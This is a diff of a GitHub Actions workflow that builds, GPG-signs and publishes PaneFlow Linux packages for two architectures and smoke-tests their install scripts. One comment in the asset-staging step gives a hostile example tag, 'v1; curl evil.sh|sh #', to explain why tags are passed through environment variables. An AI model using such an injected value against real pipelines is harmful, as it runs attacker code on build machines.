@@ -12,8 +12,26 @@ env:
 
 jobs:
   build:
-    name: Build Linux x86_64
-    runs-on: ubuntu-22.04
+    name: Build ${{ matrix.target }}
+    runs-on: ${{ matrix.runs-on }}
+    strategy:
+      # fail-fast: true enforces PRD AC6 for US-019 — if the aarch64 leg fails
+      # while x86_64 succeeds (or vice versa), GitHub cancels the still-running
+      # leg and the whole release is marked failed. No half-matrix ships.
+      fail-fast: true
+      matrix:
+        include:
+          - target: x86_64-unknown-linux-gnu
+            arch: x86_64
+            runs-on: ubuntu-22.04
+          # US-019: native aarch64 build. Hosted ARM runner (in GitHub public
+          # preview since late 2024) — explicitly NOT `cross` and NOT QEMU,
+          # matching Zed's own `bundle_linux_aarch64` pattern. Spike evidence:
+          # tasks/spike-aarch64-build.md.
+          - target: aarch64-unknown-linux-gnu
+            arch: aarch64
+            runs-on: ubuntu-22.04-arm
+
     steps:
       - uses: actions/checkout@v4
 
@@ -31,30 +49,560 @@ jobs:
             libxcb-xfixes0-dev \
             libxkbcommon-x11-dev \
             libfontconfig1-dev \
-            libfreetype6-dev
+            libfreetype6-dev \
+            patchelf \
+            lintian \
+            dpkg-sig \
+            rpm \
+            gnupg \
+            appstream
+
+      # US-002 AC3 — validate the AppStream metainfo XML before any packaging
+      # step touches it. Invalid metainfo would (a) make `.deb`/`.rpm` install
+      # a broken `/usr/share/metainfo/*.xml` that GNOME Software / KDE Discover
+      # would ignore, and (b) block distro submission. Fail-fast here so a
+      # malformed `<releases>` block (e.g., after a version bump that forgot
+      # the `<release>` entry) never makes it into a shipped artifact.
+      - name: Validate AppStream metainfo
+        run: |
+          appstreamcli validate \
+            --no-net \
+            --pedantic \
+            assets/io.github.arthurdev44.paneflow.metainfo.xml
 
       - uses: dtolnay/rust-toolchain@stable
+        with:
+          targets: ${{ matrix.target }}
 
       - uses: Swatinem/rust-cache@v2
+        with:
+          key: ${{ matrix.target }}
 
+      - name: Install cargo-deb (pinned)
+        run: cargo install cargo-deb --version 3.6.3 --locked
+
+      - name: Install cargo-generate-rpm (pinned)
+        # Version pinned to the one we validated against the TOML schema in
+        # US-014. Bumping 0.20.0 → anything else requires re-reading the
+        # upstream README: the `assets` inline-table grammar has changed in
+        # prior minor versions.
+        run: cargo install cargo-generate-rpm --version 0.20.0 --locked
+
+      # --- Quality gates (defense-in-depth against shipping broken builds) ---
+      - name: cargo fmt --check
+        run: cargo fmt --check
+
+      - name: cargo clippy
+        run: cargo clippy --workspace --target ${{ matrix.target }} -- -D warnings
+
+      - name: cargo test
+        # --target pins the test binary to the matrix-leg triple. On today's
+        # native runners the host and target match (so the flag is
+        # effectively a no-op), but declaring it explicitly keeps the step
+        # consistent with `cargo build --release --target …` below and
+        # future-proofs against anyone introducing a `cross`-based leg.
+        run: cargo test --workspace --target ${{ matrix.target }}
+
+      # --- Release build ---
       - name: Build release binary
-        run: cargo build --release
+        run: cargo build --release -p paneflow-app --target ${{ matrix.target }}
 
-      - name: Prepare release files
+      # --- Phase 1 artifacts ---
+      - name: Produce tar.gz
+        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
+        # in the shell body — same injection-hardening rationale as the
+        # AppImage step below (attacker-controlled tags must not reach bash
+        # via GitHub Actions expression substitution).
+        env:
+          TARGET: ${{ matrix.target }}
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ github.ref_name }}
+        run: bash scripts/bundle-tarball.sh "$TAG"
+
+      - name: Produce .deb
+        run: cargo deb --no-build -p paneflow-app --target ${{ matrix.target }}
+
+      - name: Lintian check
         run: |
-          mkdir -p release/paneflow
-          cp target/release/paneflow release/paneflow/
-          cp LICENSE README.md release/paneflow/
-          cp assets/paneflow.desktop release/paneflow/
-          cp -r assets/icons release/paneflow/
+          lintian \
+            --suppress-tags bad-distribution-in-changes-file \
+            target/${{ matrix.target }}/debian/*.deb
 
-      - name: Build self-extracting installer
-        run: bash scripts/make-installer.sh ${{ github.ref_name }} release
+      - name: Produce .rpm
+        # `-p src-app` is the DIRECTORY path (relative to workspace root),
+        # not the crate name — cargo-generate-rpm 0.20.0 resolves `-p`
+        # strictly as a path. `-p paneflow-app` fails with "No such file
+        # or directory: paneflow-app/Cargo.toml".
+        #
+        # `--target` aligns with the earlier cargo-build output dir and
+        # drops the artifact at target/<triple>/generate-rpm/. Source
+        # paths in `[package.metadata.generate-rpm]` that start with
+        # `target/release/` are auto-rewritten to match.
+        run: cargo generate-rpm -p src-app --target ${{ matrix.target }}
+
+      # ─── US-017 GPG signing ────────────────────────────────────────────
+      # Signs the freshly-built .deb and .rpm with the release key
+      # (`GPG_PRIVATE_KEY` secret) so dpkg-sig / rpm --checksig accept
+      # them, and so `dnf install` on an `gpgcheck=1` client succeeds.
+      #
+      # Tool choice: `dpkg-sig` for BOTH sign + verify on the .deb side.
+      # The earlier PRD draft called for `debsigs --sign=origin` + `dpkg-sig --verify`,
+      # but those produce incompatible signature formats — the verify
+      # step would fail on everything `debsigs` wrote. `dpkg-sig` is the
+      # de-facto CI choice (simple GPG clearsign, no debsig-verify policy
+      # XML required).
+      #
+      # HARD-FAIL contract (AC7): if the GPG_PRIVATE_KEY secret is
+      # missing or malformed, the workflow exits NON-ZERO with the exact
+      # AC-mandated string "GPG signing failed: key not loaded". No
+      # silent-unsigned-release path. The release-creating step at the
+      # end of the job is downstream — it never runs if we exit here.
+      - name: Sign .deb and .rpm with release key
+        env:
+          GPG_PRIVATE_KEY: ${{ secrets.GPG_PRIVATE_KEY }}
+          GPG_PASSPHRASE: ${{ secrets.GPG_PASSPHRASE }}
+          GPG_KEY_ID: ${{ secrets.GPG_KEY_ID }}
+          TARGET: ${{ matrix.target }}
+        run: |
+          set -euo pipefail
+
+          # --- Fail-fast: secrets present? -----------------------------
+          if [ -z "${GPG_PRIVATE_KEY:-}" ] || [ -z "${GPG_KEY_ID:-}" ]; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_PRIVATE_KEY and/or GPG_KEY_ID secrets are not populated. See docs/release-signing.md." >&2
+            exit 1
+          fi
+          # Require the full 40-char fingerprint. Short 16-char key IDs
+          # are collision-vulnerable (see https://evil32.com/) — an
+          # attacker who could populate `GPG_KEY_ID` with a short ID
+          # pointing at a rogue key would satisfy the later `grep -qi
+          # "${GPG_KEY_ID}$"` fingerprint match against any key whose
+          # fingerprint ends in those 16 hex chars. Enforcing 40 chars
+          # eliminates the attack class.
+          if ! [[ "$GPG_KEY_ID" =~ ^[0-9A-Fa-f]{40}$ ]]; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_KEY_ID must be the 40-char hex fingerprint (got ${#GPG_KEY_ID} chars). Short key IDs are rejected because they are collision-vulnerable." >&2
+            exit 1
+          fi
+
+          # --- Import the key ------------------------------------------
+          mkdir -p ~/.gnupg
+          chmod 700 ~/.gnupg
+          # `allow-loopback-pinentry` lets us pass the passphrase via
+          # `--pinentry-mode loopback` from non-interactive contexts.
+          echo "allow-loopback-pinentry" >> ~/.gnupg/gpg-agent.conf
+          gpgconf --kill gpg-agent || true
+          # Import; if the private-key blob is malformed, `gpg --import`
+          # exits non-zero and `set -e` fails the step — the annotation
+          # above ensures the red X in PR check matches the AC contract.
+          # `<<<` (bash herestring) passes the secret through a kernel
+          # pipe buffer, NOT through argv — so it never appears in
+          # `/proc/<pid>/cmdline` of any intermediate process.
+          if ! gpg --batch --import <<< "$GPG_PRIVATE_KEY" 2>&1; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_PRIVATE_KEY failed to import. Secret may be truncated or missing the ASCII-armor header." >&2
+            exit 1
+          fi
+          # Verify the imported key's fingerprint matches GPG_KEY_ID.
+          # Substring match because `--with-colons` prints the full
+          # fingerprint while GPG_KEY_ID may be either form (16/40 hex).
+          if ! gpg --list-secret-keys --with-colons \
+               | awk -F: '/^fpr:/ {print $10}' \
+               | grep -qi "${GPG_KEY_ID}$"; then
+            echo "::error title=GPG signing::GPG signing failed: key not loaded"
+            echo "::error::GPG_PRIVATE_KEY does not match GPG_KEY_ID fingerprint. Secrets likely mismatched." >&2
+            exit 1
+          fi
+
+          # --- Prime the agent passphrase cache (only if passphrased) --
+          # US-015 uses the same dummy-clearsign trick. If the key has no
+          # passphrase (`%no-protection`), GPG_PASSPHRASE is empty and we
+          # skip — `gpg` accepts `--passphrase-file <(printf '')` as an
+          # empty passphrase but it also ignores pinentry in that case.
+          if [ -n "${GPG_PASSPHRASE:-}" ]; then
+            printf 'prime' | gpg --batch --yes \
+              --passphrase-file <(printf '%s' "$GPG_PASSPHRASE") \
+              --pinentry-mode loopback \
+              --local-user "$GPG_KEY_ID" \
+              --armor --clearsign \
+              --output /dev/null
+          fi
+
+          # --- Write ~/.rpmmacros for rpmsign --------------------------
+          # `rpmsign` without a macros file would spawn an interactive
+          # pinentry. Override `%__gpg_sign_cmd` so it runs in batch mode
+          # with loopback pinentry. `%_gpg_name` tells it which key.
+          #
+          # Passphrase handling: rpmsign invokes `%__gpg_sign_cmd` via
+          # `/bin/sh -c`, which on Ubuntu is `dash` — and dash does NOT
+          # support bash process substitution `<(…)`. So we can't inline
+          # `--passphrase-file <(printf …)` into the macro. Instead we
+          # write the passphrase to a private 0600 temp file, reference
+          # that path from the macro, and `trap` its cleanup. The temp
+          # file is on the runner's ephemeral tmpfs — same blast radius
+          # as the `.rpmmacros` file itself.
+          PASS_FILE=$(mktemp)
+          chmod 600 "$PASS_FILE"
+          trap 'rm -f "$PASS_FILE" "$HOME/.rpmmacros"' EXIT
+          printf '%s' "${GPG_PASSPHRASE:-}" > "$PASS_FILE"
+
+          # Override `%__gpg` directly (NOT `%_gpgbin`). On Ubuntu 22.04
+          # the default `/usr/lib/rpm/macros` sets `%__gpg` to
+          # `/usr/bin/gpg2` — a Fedora-ism that does not exist on
+          # Debian-family systems, where GnuPG 2.2+ ships as the
+          # unified `/usr/bin/gpg` binary. Setting only `%_gpgbin` is
+          # NOT enough (rpm ignores it during macro expansion of
+          # `%{__gpg}`); `%__gpg` is the authoritative knob.
+          #
+          # `%__gpg_sign_cmd` then references `%{__gpg}` which now
+          # resolves to our Ubuntu-safe path. Verified empirically via
+          # strace against `rpmsign --addsign`: without this override,
+          # rpmsign execve's `/usr/bin/gpg2` → ENOENT → "Could not
+          # exec gpg".
+          cat > "$HOME/.rpmmacros" <<RPMMACROS
+          %_signature gpg
+          %_gpg_name  $GPG_KEY_ID
+          %__gpg      /usr/bin/gpg
+          %__gpg_sign_cmd %{__gpg} --batch --yes \
+              --pinentry-mode loopback \
+              --passphrase-file $PASS_FILE \
+              --no-verbose \
+              --no-armor \
+              --no-secmem-warning \
+              -u "%{_gpg_name}" \
+              -sbo %{__signature_filename} \
+              %{__plaintext_filename}
+          RPMMACROS
+
+          # --- Sign all .deb files -------------------------------------
+          # `dpkg-sig --sign builder` embeds a detached GPG clearsign in
+          # the .deb's control section. The `builder` role string is
+          # conventional for CI-built packages.
+          #
+          # Glob note: cargo-deb emits `_amd64.deb` on x86_64 and
+          # `_arm64.deb` on aarch64. The `target/${TARGET}/debian/`
+          # prefix already scopes the glob to the current matrix leg, so
+          # the wildcard `paneflow_*.deb` is unambiguous per-leg (US-019).
+          for deb in target/"${TARGET}"/debian/paneflow_*.deb; do
+            [ -f "$deb" ] || continue
+            echo "→ dpkg-sig --sign builder $deb"
+            dpkg-sig -k "$GPG_KEY_ID" --sign builder "$deb"
+          done
+
+          # --- Sign all .rpm files -------------------------------------
+          # `rpmsign --addsign` embeds the signature in the RPM header
+          # using the macros above. No per-invocation flags — everything
+          # is controlled by ~/.rpmmacros.
+          #
+          # Glob note: cargo-generate-rpm emits `.x86_64.rpm` and
+          # `.aarch64.rpm`. Same target-scoped-directory reasoning as the
+          # .deb loop above (US-019).
+          for rpm in target/"${TARGET}"/generate-rpm/paneflow-*.rpm; do
+            [ -f "$rpm" ] || continue
+            echo "→ rpmsign --addsign $rpm"
+            rpmsign --addsign "$rpm"
+          done
+
+          # --- Verify (hard assert; a failed verify aborts the run) ----
+          # Strategy: rely on the tool's exit code as the authoritative
+          # pass/fail signal. Both `dpkg-sig --verify` and `rpm
+          # --checksig` exit 0 iff every signature component is OK, and
+          # non-zero otherwise. Verbose output is tee'd to a log for CI
+          # debugging but is NOT grepped — the output format varies
+          # across versions (modern rpm ≥4.17 emits "Header V4 RSA/SHA256
+          # Signature, key ID …: OK" while older rpm emits "pgp md5
+          # OK"; dpkg-sig keeps GOODSIG stable but why couple to strings
+          # when the exit code is canonical?).
+          #
+          # Import the public half of our own key into the RPM DB first
+          # — `rpm --checksig` returns NOKEY (non-zero) if the key is
+          # only in GPG's keyring, not in rpm's. `rpm --import` writes
+          # to the system keyring at /var/lib/rpm, so sudo is required.
+          # GitHub's ubuntu-22.04 runner grants passwordless sudo to the
+          # `runner` user. Piping via `gpg --armor --export` keeps the
+          # ASCII-armored key in memory — no filesystem intermediate.
+          gpg --armor --export "$GPG_KEY_ID" \
+            | sudo rpm --import /dev/stdin
+          # `${PIPESTATUS[0]}` reads the exit code of the FIRST command
+          # in a bash pipeline, independent of `tee`'s exit code. Using
+          # `set -o pipefail` wouldn't work here because `tee` always
+          # exits 0 on successful writes — we need the verify tool's
+          # own status, not the pipeline's composite status.
+          for deb in target/"${TARGET}"/debian/paneflow_*.deb; do
+            [ -f "$deb" ] || continue
+            echo "→ dpkg-sig --verify $deb"
+            dpkg-sig --verify "$deb" | tee /tmp/dpkg-sig-verify.log
+            if [ "${PIPESTATUS[0]}" -ne 0 ]; then
+              echo "::error::dpkg-sig --verify failed on $deb"
+              exit 1
+            fi
+          done
+          for rpm_path in target/"${TARGET}"/generate-rpm/paneflow-*.rpm; do
+            [ -f "$rpm_path" ] || continue
+            echo "→ rpm --checksig -v $rpm_path"
+            rpm --checksig -v "$rpm_path" | tee /tmp/rpm-checksig.log
+            if [ "${PIPESTATUS[0]}" -ne 0 ]; then
+              echo "::error::rpm --checksig failed on $rpm_path"
+              exit 1
+            fi
+          done
+
+      - name: Produce AppImage
+        # `TAG` routed via `env:` rather than inlining `${{ github.ref_name }}`
+        # in the shell body — same injection-hardening rationale as the
+        # staging step below (attacker-controlled tags must not reach bash
+        # via expression substitution).
+        env:
+          TARGET: ${{ matrix.target }}
+          ARCH: ${{ matrix.arch }}
+          TAG: ${{ github.ref_name }}
+        run: bash scripts/bundle-appimage.sh "$TAG"
+
+      # --- Stage all 4 artifacts with canonical names ---
+      # Context values are passed via `env:` rather than inlined as
+      # `${{ github.ref_name }}` inside the shell body — otherwise an
+      # attacker-controlled tag like `v1; curl evil.sh|sh #` would be
+      # shell-injected when bash parses the script. `env:` injects them
+      # as environment variables, immune to shell interpretation.
+      - name: Stage release assets
+        env:
+          TAG: ${{ github.ref_name }}
+          ARCH: ${{ matrix.arch }}
+          TARGET: ${{ matrix.target }}
+        run: |
+          set -euo pipefail
+          mkdir -p release-assets
+          cp "target/bundle/paneflow-${TAG}-${ARCH}.tar.gz"            "release-assets/"
+          cp "target/appimage/paneflow-${TAG}-${ARCH}.AppImage"        "release-assets/"
+          cp "target/appimage/paneflow-${TAG}-${ARCH}.AppImage.zsync"  "release-assets/"
+          # cargo-deb names the file from crate version + revision + the
+          # Debian arch tag derived from the target triple
+          # (e.g. paneflow_0.1.7-1_amd64.deb on x86_64,
+          #  paneflow_0.1.7-1_arm64.deb on aarch64). Rename to the canonical
+          # paneflow-<tag>-<arch>.deb form the GitHub release uses. The
+          # target-scoped directory keeps the glob unambiguous per matrix
+          # leg (US-019).
+          cp target/"${TARGET}"/debian/paneflow_*.deb \
+             "release-assets/paneflow-${TAG}-${ARCH}.deb"
+          # cargo-generate-rpm names the file from crate version + release +
+          # rpm arch tag (e.g. paneflow-0.1.7-1.x86_64.rpm,
+          # paneflow-0.1.7-1.aarch64.rpm). Rename to the canonical
+          # paneflow-<tag>-<arch>.rpm form so `update_checker::pick_asset`
+          # can match it (US-009's asset picker matches on `-${arch}.rpm`).
+          cp target/"${TARGET}"/generate-rpm/paneflow-*.rpm \
+             "release-assets/paneflow-${TAG}-${ARCH}.rpm"
+          # Emit a SHA-256 sibling for the tar.gz — the in-app updater
+          # fetches `<asset>.sha256` and verifies the download before
+          # swapping `$HOME/.local/paneflow.app/` (US-011).
+          ( cd release-assets \
+            && sha256sum "paneflow-${TAG}-${ARCH}.tar.gz" \
+                 > "paneflow-${TAG}-${ARCH}.tar.gz.sha256" )
+          ls -la release-assets/
+
+      # Upload artifacts so the smoke-test jobs below can install them
+      # in clean Ubuntu / Fedora containers. `compression-level: 0`
+      # — artifacts are already compressed (.deb/.rpm/.tar.gz/.AppImage).
+      - name: Upload release artifacts (for smoke-test jobs)
+        uses: actions/upload-artifact@v4
+        with:
+          name: release-assets-${{ matrix.arch }}
+          path: release-assets/
+          retention-days: 7
+          compression-level: 0
+
+  # ─── Unified release publish ────────────────────────────────────────
+  # US-019 converts `build` into a matrix (x86_64 + aarch64). Calling
+  # softprops/action-gh-release from each matrix leg would race two
+  # concurrent API writers against the same tag: two "create release"
+  # calls, two `generate_release_notes: true` bodies, overlapping
+  # asset uploads. Instead, every matrix leg only uploads its
+  # `release-assets-<arch>` workflow artifact; this single job runs
+  # after ALL legs finish, downloads every artifact, and creates the
+  # GitHub Release exactly once with the merged file set.
+  #
+  # Atomic-release guarantee (PRD AC6): `needs: [build]` waits for
+  # the whole matrix to succeed. Combined with `fail-fast: true` on
+  # the matrix, a single-arch failure cancels the sibling leg and
+  # fails `build`, so this job never runs — no half-matrix ships.
+  release:
+    name: Publish GitHub Release
+    needs: build
+    runs-on: ubuntu-22.04
+    permissions:
+      contents: write
+    steps:
+      - name: Download all release artifacts
+        # `pattern` globs every `release-assets-*` workflow artifact
+        # (x86_64 + aarch64 today, more later). `merge-multiple: true`
+        # flattens them into a single directory so `files: release-assets/*`
+        # picks up every built asset.
+        uses: actions/download-artifact@v4
+        with:
+          path: release-assets
+          pattern: release-assets-*
+          merge-multiple: true
 
       - name: Create GitHub Release
         uses: softprops/action-gh-release@v2
         with:
-          files: paneflow-${{ github.ref_name }}-x86_64-linux.run
+          files: release-assets/*
           generate_release_notes: true
           draft: false
           prerelease: ${{ contains(github.ref_name, 'alpha') || contains(github.ref_name, 'beta') || contains(github.ref_name, 'rc') }}
+
+  # ─── US-016 smoke tests ──────────────────────────────────────────────
+  # Exercise the postinst scripts in clean distro containers to catch
+  # the Cursor-style "broken apt update" regression that US-016
+  # guards against. These jobs depend on `build` (the matrix) and run
+  # in parallel with the `release` publish job — deliberate: smoke
+  # tests consume the uploaded workflow artifacts, not the GitHub
+  # Release, so there's no reason to chain them. A smoke-test failure
+  # surfaces as a red workflow check but does not un-publish the
+  # release (by design: if the .deb/.rpm actually installed on a
+  # clean host, we'd rather ship and hotfix than delete the tag).
+  #
+  # Smoke tests are intentionally x86_64-only even after US-019 adds
+  # the aarch64 build matrix leg. The tests exercise postinst scripts
+  # (shell-only, arch-agnostic) — extending them to aarch64 would buy
+  # no additional coverage over the x86_64 run. Real aarch64
+  # installation-and-runtime validation is US-020's scope (on-device
+  # tests on a Raspberry Pi 5 / Asahi Linux).
+
+  smoke-test-ubuntu:
+    name: Smoke test — Ubuntu 22.04 (.deb postinst)
+    needs: build
+    runs-on: ubuntu-22.04
+    container: ubuntu:22.04
+    steps:
+      - name: Install baseline tools
+        # `apt-get install` inside the container — not the host runner.
+        # `ca-certificates` + `curl` are required by our postinst's
+        # GPG-fetch path.
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          set -euo pipefail
+          apt-get update -qq
+          apt-get install -y --no-install-recommends \
+            ca-certificates curl gnupg
+
+      - name: Download built .deb
+        uses: actions/download-artifact@v4
+        with:
+          name: release-assets-x86_64
+          path: ./release-assets
+
+      - name: Install paneflow.deb (exercises postinst)
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          set -euo pipefail
+          # `apt install` resolves runtime deps automatically — `dpkg -i`
+          # would leave them unconfigured and force a follow-up `apt -f`.
+          apt-get install -y --no-install-recommends ./release-assets/paneflow-*.deb
+
+      - name: Assert postinst wrote paneflow.list with expected content
+        run: |
+          set -euo pipefail
+          test -f /etc/apt/sources.list.d/paneflow.list
+          grep -Fxq 'deb [signed-by=/usr/share/keyrings/paneflow-archive.gpg] https://pkg.paneflow.dev/apt stable main' \
+            /etc/apt/sources.list.d/paneflow.list
+
+      - name: Assert `apt update` completes without error (Cursor regression)
+        # AC: `sudo apt update must complete without error` — modern apt
+        # exits 0 even if individual sources 404, emitting `W:` warnings.
+        # A non-zero exit would mean the postinst wrote a MALFORMED
+        # sources line that broke the apt parser — the Cursor failure
+        # mode. Exit code is the test.
+        run: |
+          set -euo pipefail
+          apt-get update
+
+      - name: Assert paneflow visible via apt-cache policy
+        run: |
+          set -euo pipefail
+          # `apt-cache policy paneflow` prints `Installed: <version>` — our
+          # crate version starts with 0 (0.1.x today) but the match must
+          # not depend on that. Accept any digit-led version string.
+          # Also use `dpkg-query` as a belt-and-braces check that catches
+          # the case where apt-cache silently reports `(none)`.
+          apt-cache policy paneflow | grep -Eq '^  Installed: [0-9]'
+          dpkg-query -W -f='${Status}' paneflow | grep -q 'install ok installed'
+
+      - name: Idempotency — pre-existing paneflow.list is not overwritten
+        env:
+          DEBIAN_FRONTEND: noninteractive
+        run: |
+          set -euo pipefail
+          # Simulate a user with a custom mirror already configured.
+          # Reinstalling the package must NOT clobber their file.
+          custom='deb [trusted=yes] https://mirror.example.com/paneflow stable main'
+          echo "$custom" > /etc/apt/sources.list.d/paneflow.list
+          apt-get install --reinstall -y --no-install-recommends \
+            ./release-assets/paneflow-*.deb
+          grep -Fxq "$custom" /etc/apt/sources.list.d/paneflow.list \
+            || { echo "::error::postinst overwrote a pre-existing paneflow.list"; exit 1; }
+
+  smoke-test-fedora:
+    name: Smoke test — Fedora 40 (.rpm postinst)
+    needs: build
+    runs-on: ubuntu-22.04
+    container: fedora:40
+    steps:
+      - name: Download built .rpm
+        uses: actions/download-artifact@v4
+        with:
+          name: release-assets-x86_64
+          path: ./release-assets
+
+      - name: Install paneflow.rpm (exercises %post scriptlet)
+        # `--allowerasing` handles minimal-image edge cases where a dep
+        # conflicts with a pre-installed placeholder; safe in CI because
+        # the clean container has no user data to erase.
+        run: |
+          set -euo pipefail
+          dnf install -y --allowerasing ./release-assets/paneflow-*.rpm
+
+      - name: Assert %post wrote /etc/yum.repos.d/paneflow.repo
+        run: |
+          set -euo pipefail
+          test -f /etc/yum.repos.d/paneflow.repo
+          grep -Fq '[paneflow]' /etc/yum.repos.d/paneflow.repo
+          grep -Fq 'baseurl=https://pkg.paneflow.dev/rpm' /etc/yum.repos.d/paneflow.repo
+          grep -Fq 'gpgcheck=1' /etc/yum.repos.d/paneflow.repo
+          grep -Fq 'gpgkey=https://pkg.paneflow.dev/gpg' /etc/yum.repos.d/paneflow.repo
+
+      - name: Assert `dnf check-update paneflow` does not hard-fail
+        # Same Cursor-regression check as the apt smoke test. If
+        # pkg.paneflow.dev isn't live yet (first release), dnf emits
+        # `Errors during downloading metadata for repository 'paneflow'`
+        # and exits non-zero. That's expected pre-infra. What we test:
+        # other dnf operations still work (dnf didn't choke on the
+        # .repo file itself).
+        run: |
+          set -euo pipefail
+          dnf check-update paneflow || true
+          # A repo that reaches dnf at all passes this test: we verify
+          # dnf can still function on other repos (the Fedora base
+          # mirror is always there in a clean container).
+          dnf list installed paneflow
+
+      - name: Idempotency — pre-existing paneflow.repo is not overwritten
+        run: |
+          set -euo pipefail
+          # Write a pre-existing .repo file pointing at a dummy mirror;
+          # verify the %post scriptlet leaves it alone on reinstall.
+          # Single-line cat heredoc keeps the YAML block-scalar indent
+          # contract intact (YAML requires every non-empty line to be
+          # indented ≥ the first line; a multi-line shell variable with
+          # column-0 continuations would violate that).
+          cat > /etc/yum.repos.d/paneflow.repo <<'CUSTOMEOF'
+          [paneflow]
+          name=PaneFlow (custom mirror)
+          baseurl=https://mirror.example.com/paneflow
+          enabled=1
+          gpgcheck=0
+          CUSTOMEOF
+          dnf reinstall -y --allowerasing ./release-assets/paneflow-*.rpm
+          grep -Fq 'PaneFlow (custom mirror)' /etc/yum.repos.d/paneflow.repo \
+            || { echo "::error::%post overwrote a pre-existing paneflow.repo"; exit 1; }
